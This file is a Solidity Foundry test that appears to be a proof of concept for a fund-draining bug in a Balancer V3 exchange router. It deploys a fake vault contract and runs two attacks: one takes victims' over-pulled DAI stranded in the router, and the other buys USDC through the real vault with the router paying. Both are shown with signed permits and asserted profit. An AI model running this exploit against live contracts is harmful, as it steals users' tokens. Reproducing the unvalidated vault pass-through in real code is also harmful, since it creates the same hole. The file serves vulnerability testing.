// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {ISignatureTransfer} from "@crane/contracts/interfaces/protocols/utils/permit2/ISignatureTransfer.sol";
import {SwapKind} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/VaultTypes.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {BalancerV3StandardExchangeRouterTypes} from "contracts/interfaces/BalancerV3StandardExchangeRouterTypes.sol";
import {TestBase_BalancerV3StandardExchangeRouter} from
    "contracts/protocols/dexes/balancer/v3/routers/TestBase_BalancerV3StandardExchangeRouter.sol";
import {BetterEfficientHashLib} from "@crane/contracts/utils/BetterEfficientHashLib.sol";

/// Attacker-deployed fake "vault". Router never validates tokenInVault in the pass-through branch.
contract FakeSEVault {
    address public immutable router;
    address public immutable owner;

    constructor(address router_, address owner_) {
        router = router_;
        owner = owner_;
    }

    // Quote = everything the router holds of tokenIn -> router pays it to us from its own balance.
    function previewExchangeOut(IERC20 tokenIn, IERC20, uint256) external view returns (uint256) {
        return tokenIn.balanceOf(router);
    }

    function exchangeOut(IERC20, uint256 maxAmountIn, IERC20, uint256, address, bool, uint256)
        external
        pure
        returns (uint256)
    {
        return maxAmountIn;
    }

    function sweep(IERC20 t) external {
        require(msg.sender == owner, "no");
        t.transfer(owner, t.balanceOf(address(this)));
    }
}

contract BalancerRouterPermitOverpull_Test is TestBase_BalancerV3StandardExchangeRouter {
    using BetterEfficientHashLib for bytes;

    string constant PERMIT_STUB =
        "PermitWitnessTransferFrom(TokenPermissions permitted,address spender,uint256 nonce,uint256 deadline,";
    string constant WITNESS_TYPE_STRING =
        "Witness witness)TokenPermissions(address token,uint256 amount)Witness(address owner,address pool,address tokenIn,address tokenInVault,address tokenOut,address tokenOutVault,uint256 amountIn,uint256 limit,uint256 deadline,bool wethIsEth,bytes32 userData)";
    bytes32 constant TOKEN_PERMISSIONS_TYPEHASH = keccak256("TokenPermissions(address token,uint256 amount)");
    bytes32 constant WITNESS_TYPEHASH = keccak256(
        "Witness(address owner,address pool,address tokenIn,address tokenInVault,address tokenOut,address tokenOutVault,uint256 amountIn,uint256 limit,uint256 deadline,bool wethIsEth,bytes32 userData)"
    );
    bytes32 constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");

    function _wh(BalancerV3StandardExchangeRouterTypes.StandardExchangeSwapSingleTokenHookParams memory p)
        internal
        pure
        returns (bytes32)
    {
        return abi.encode(
            WITNESS_TYPEHASH,
            p.sender,
            p.pool,
            address(p.tokenIn),
            address(p.tokenInVault),
            address(p.tokenOut),
            address(p.tokenOutVault),
            p.amountGiven,
            p.limit,
            p.deadline,
            p.wethIsEth,
            keccak256(p.userData)
        )._hash();
    }

    function _digest(
        BalancerV3StandardExchangeRouterTypes.StandardExchangeSwapSingleTokenHookParams memory p,
        address token,
        uint256 amount,
        uint256 nonce
    ) internal view returns (bytes32) {
        bytes32 ph = abi.encode(
            keccak256(abi.encodePacked(PERMIT_STUB, WITNESS_TYPE_STRING)),
            keccak256(abi.encode(TOKEN_PERMISSIONS_TYPEHASH, token, amount)),
            address(seRouter),
            nonce,
            p.deadline,
            _wh(p)
        )._hash();
        bytes32 dom = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256("Permit2"), block.chainid, address(permit2)));
        return keccak256(abi.encodePacked("\x19\x01", dom, ph));
    }

    function _sign(
        uint256 pk,
        BalancerV3StandardExchangeRouterTypes.StandardExchangeSwapSingleTokenHookParams memory p,
        address token,
        uint256 amount,
        uint256 nonce
    ) internal view returns (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory sig) {
        permit = ISignatureTransfer.PermitTransferFrom({
            permitted: ISignatureTransfer.TokenPermissions({token: token, amount: amount}),
            nonce: nonce,
            deadline: p.deadline
        });
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, _digest(p, token, amount, nonce));
        sig = abi.encodePacked(r, s, v);
    }

    function _victimParams(address victim, IERC20 tIn, IERC20 tOut, uint256 out, uint256 lim)
        internal
        view
        returns (BalancerV3StandardExchangeRouterTypes.StandardExchangeSwapSingleTokenHookParams memory p)
    {
        p.sender = victim;
        p.kind = SwapKind.EXACT_OUT;
        p.pool = daiUsdcPool;
        p.tokenIn = tIn;
        p.tokenInVault = IStandardExchangeProxy(address(0));
        p.tokenOut = tOut;
        p.tokenOutVault = IStandardExchangeProxy(address(0));
        p.amountGiven = out;
        p.limit = lim;
        p.deadline = block.timestamp + 1 hours;
        p.wethIsEth = false;
        p.userData = "";
    }

    function _doVictim(address victim, uint256 pk, uint256 out, uint256 lim, uint256 nonce)
        internal
        returns (uint256 amountIn)
    {
        dai.mint(victim, lim);
        vm.startPrank(victim);
        IERC20(address(dai)).approve(address(permit2), type(uint256).max);
        BalancerV3StandardExchangeRouterTypes.StandardExchangeSwapSingleTokenHookParams memory q =
            _victimParams(victim, IERC20(address(dai)), IERC20(address(usdc)), out, lim);
        (ISignatureTransfer.PermitTransferFrom memory pq, bytes memory sq) = _sign(pk, q, address(dai), lim, nonce);
        amountIn = seRouter.swapSingleTokenExactOutWithPermit(q, pq, sq);
        vm.stopPrank();
    }

    /// Honest victim: exact-out permit swap of `out` tokenOut with `slipBps` slippage over the true cost.
    function _victimSwap(string memory name, uint256 out, uint256 slipBps)
        internal
        returns (uint256 amountIn, uint256 limit, uint256 victimSpent)
    {
        (address victim, uint256 pk) = makeAddrAndKey(name);
        // Determine true cost (test-side quote via snapshot; not part of attack).
        uint256 snap = vm.snapshotState();
        amountIn = _doVictim(victim, pk, out, out * 3, 0);
        vm.revertToState(snap);

        limit = amountIn * (10_000 + slipBps) / 10_000;
        uint256 got = _doVictim(victim, pk, out, limit, uint256(keccak256(bytes(name))));
        victimSpent = limit - dai.balanceOf(victim);
        assertEq(got, amountIn, "same cost as quote");
        assertEq(usdc.balanceOf(victim), out, "victim got exact out");
    }

    function test_R1_overpull_strands_and_attacker_steals_residue() public {
        uint256 routerBefore = dai.balanceOf(address(seRouter));
        assertEq(routerBefore, 0, "router starts clean");

        // --- Honest victims (1% and 0.5% slippage, typical UI settings) ---
        (uint256 in1, uint256 lim1, uint256 spent1) = _victimSwap("victim1", 1000e18, 100);
        (uint256 in2, uint256 lim2, uint256 spent2) = _victimSwap("victim2", 500e18, 50);
        uint256 loss1 = spent1 - in1;
        uint256 loss2 = spent2 - in2;
        console2.log("victim1 amountIn (true cost)", in1);
        console2.log("victim1 limit / pulled       ", lim1, spent1);
        console2.log("victim1 stranded loss        ", loss1);
        console2.log("victim2 amountIn (true cost)", in2);
        console2.log("victim2 limit / pulled       ", lim2, spent2);
        console2.log("victim2 stranded loss        ", loss2);
        assertEq(spent1, lim1, "victim1 debited full limit");
        assertEq(spent2, lim2, "victim2 debited full limit");
        uint256 residue = dai.balanceOf(address(seRouter));
        console2.log("router DAI residue          ", residue);
        assertEq(residue, loss1 + loss2, "residue == sum of victim over-pulls");
        assertGt(residue, 0);

        // --- Attack: unprivileged attacker, 1 wei cost ---
        (address attacker, uint256 apk) = makeAddrAndKey("attacker");
        dai.mint(attacker, 1); // attacker cost: 1 wei DAI (returned in the sweep)
        vm.startPrank(attacker);
        FakeSEVault fake = new FakeSEVault(address(seRouter), attacker);
        IERC20(address(dai)).approve(address(permit2), type(uint256).max);

        BalancerV3StandardExchangeRouterTypes.StandardExchangeSwapSingleTokenHookParams memory p;
        p.sender = attacker;
        p.kind = SwapKind.EXACT_OUT;
        p.pool = address(fake);
        p.tokenIn = IERC20(address(dai));
        p.tokenInVault = IStandardExchangeProxy(address(fake));
        p.tokenOut = IERC20(address(usdc));
        p.tokenOutVault = IStandardExchangeProxy(address(fake));
        p.amountGiven = 1;
        p.limit = 1;
        p.deadline = block.timestamp + 1 hours;
        p.wethIsEth = false;
        p.userData = "";
        (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory sig) = _sign(apk, p, address(dai), 1, 777);

        uint256 attackerBefore = dai.balanceOf(attacker); // = 1
        seRouter.swapSingleTokenExactOutWithPermit(p, permit, sig);
        fake.sweep(IERC20(address(dai)));
        vm.stopPrank();

        uint256 attackerAfter = dai.balanceOf(attacker);
        int256 profit = int256(attackerAfter) - int256(attackerBefore);
        console2.log("attacker DAI before/after   ", attackerBefore, attackerAfter);
        console2.log("attacker net profit (DAI wei)", uint256(profit));
        console2.log("router DAI after attack     ", dai.balanceOf(address(seRouter)));

        assertEq(dai.balanceOf(address(seRouter)), 0, "router drained");
        assertEq(uint256(profit), residue, "attacker profit == victims' stranded funds");
        assertGt(profit, 0, "attacker profits");
    }

    /// Variant: the commented-out limit check lets an attacker buy USDC from the REAL SE vault
    /// paying with DAI out of the router's balance (limit=1).
    function test_R1_attacker_uses_real_vault_passthrough() public {
        _victimSwap("victim1", 1000e18, 100);
        _victimSwap("victim2", 500e18, 50);
        uint256 residue = dai.balanceOf(address(seRouter));
        console2.log("router DAI residue          ", residue);

        // Choose largest amountOut whose preview cost fits in residue (+1 wei the attacker contributes).
        uint256 lo = 0;
        uint256 hi = residue;
        for (uint256 i = 0; i < 80 && lo < hi; ++i) {
            uint256 mid = (lo + hi + 1) / 2;
            uint256 c = daiUsdcVault.previewExchangeOut(IERC20(address(dai)), IERC20(address(usdc)), mid);
            if (c <= residue) lo = mid;
            else hi = mid - 1;
        }
        uint256 amountOut = lo;
        console2.log("chosen USDC amountOut       ", amountOut);
        assertGt(amountOut, 0);

        (address attacker, uint256 apk) = makeAddrAndKey("attacker2");
        dai.mint(attacker, 1);
        vm.startPrank(attacker);
        IERC20(address(dai)).approve(address(permit2), type(uint256).max);
        BalancerV3StandardExchangeRouterTypes.StandardExchangeSwapSingleTokenHookParams memory p;
        p.sender = attacker;
        p.kind = SwapKind.EXACT_OUT;
        p.pool = address(daiUsdcVault);
        p.tokenIn = IERC20(address(dai));
        p.tokenInVault = daiUsdcVault;
        p.tokenOut = IERC20(address(usdc));
        p.tokenOutVault = daiUsdcVault;
        p.amountGiven = amountOut;
        p.limit = 1;
        p.deadline = block.timestamp + 1 hours;
        p.wethIsEth = false;
        p.userData = "";
        (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory sig) = _sign(apk, p, address(dai), 1, 778);
        uint256 usdcBefore = usdc.balanceOf(attacker);
        uint256 daiBefore = dai.balanceOf(attacker);
        uint256 cost = seRouter.swapSingleTokenExactOutWithPermit(p, permit, sig);
        vm.stopPrank();

        uint256 usdcGot = usdc.balanceOf(attacker) - usdcBefore;
        uint256 daiSpent = daiBefore - dai.balanceOf(attacker);
        console2.log("router-paid DAI (estimatedAmountIn)", cost);
        console2.log("attacker USDC received      ", usdcGot);
        console2.log("attacker DAI spent          ", daiSpent);
        console2.log("router DAI left             ", dai.balanceOf(address(seRouter)));
        assertEq(daiSpent, 1, "attacker paid only 1 wei");
        assertGe(usdcGot, amountOut, "attacker got USDC");
        assertGt(usdcGot, daiSpent * 1000, "profit");
    }
}
